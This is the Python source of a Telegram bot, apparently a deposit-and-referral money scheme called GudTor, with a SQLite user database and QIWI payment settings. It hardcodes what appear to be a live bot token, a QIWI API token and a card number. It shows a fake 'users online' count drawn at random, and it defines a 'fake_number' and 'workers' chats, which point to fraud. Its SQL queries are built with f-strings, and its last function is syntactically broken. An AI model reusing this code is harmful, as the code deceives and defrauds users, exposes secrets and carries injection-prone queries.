import telebot
import sqlite3
import random

bot = telebot.TeleBot("5292420094:AAE-0pDRPI4s2M5P6qwXaV0WzRKqL32smiY", threaded=True, num_threads=300)

con = sqlite3.connect("dannie_2.db")
cur = con.cursor()

admin_1 = 5086068572
admin_2 = 5086068572

admin_chat = -1001191992636
workers_chat = -1001369897598
conclusion_channel = -1001319208173

support_nickname = 'maindaybot'

manual_link = "https://telegra.ph/Primer-11-16-3"
manual_link_2 = "https://telegra.ph/Kak-skryt-referalnuyu-ssylku-02-07"
screens_bot = "screens_help_robot"

bot_name = "GudTor"
fake_number = "79952743285"
min_summa = 55
min_deposit = 0
people = 10
percent = 20

QIWI_TOKEN = '6ca55592b75f07e785341b3d06c0302e'
QIWI_NUMBER = '4890494796173508'

# Работа с бд
def get_status(message):
    con = sqlite3.connect("dannie_2.db")
    cur = con.cursor()
    cur.execute(f"""SELECT status FROM users WHERE id = '{message.chat.id}' """)
    status = cur.fetchone()[0]
    return status


def get_balance(message):
    con = sqlite3.connect("dannie_2.db")
    cur = con.cursor()
    cur.execute(f"""SELECT balance FROM users WHERE id = '{message.chat.id}' """)
    balance = cur.fetchone()[0]
    return balance


def get_last_popolnenie(message):
    con = sqlite3.connect("dannie_2.db")
    cur = con.cursor()
    cur.execute(f"""SELECT last_popolnenie FROM users WHERE id = '{message.chat.id}' """)
    last_popolnenie = cur.fetchone()[0]
    return last_popolnenie


def get_referals(message):
    con = sqlite3.connect("dannie_2.db")
    cur = con.cursor()
    cur.execute(f"""SELECT referals FROM users WHERE id = '{message.chat.id}' """)
    referals = cur.fetchone()[0]
    return referals


def get_ref_balance(message):
    con = sqlite3.connect("dannie_2.db")
    cur = con.cursor()
    cur.execute(f"""SELECT ref_balance FROM users WHERE id = '{message.chat.id}' """)
    ref_balance = cur.fetchone()[0]
    return ref_balance


def get_ref_link(message):
    ref_link = f"http://t.me/{bot_name}?start={message.chat.id}"
    return ref_link

def get_random_number(message):
    random_number = random.choice(range (60, 70))
    return random_number


def get_inf_profil(balance, referals, ref_balance, ref_link, random_number):
    inf_profil = f"👤 ЛИЧНЫЙ КАБИНЕТ 👤\n\n" \
                 f"💵 БАЛАНС 💵\n" \
                 f"{balance}₽\n\n\n" \
                 f"👥 Ваши рефералы 👥\n" \
                 f"{referals}\n\n" \
                 f"💰 Ваш реферальный баланс 💰\n" \
                 f"{ref_balance}₽\n\n" \
                 f"⛓ Ваша реферальная ссылка ⛓\n" \
                 f"{ref_link}\n\n" \
                 f"🎲 Число человек онлайн 🎲\n" \
                 f"{random_number}\n\n"\
    return inf_profil
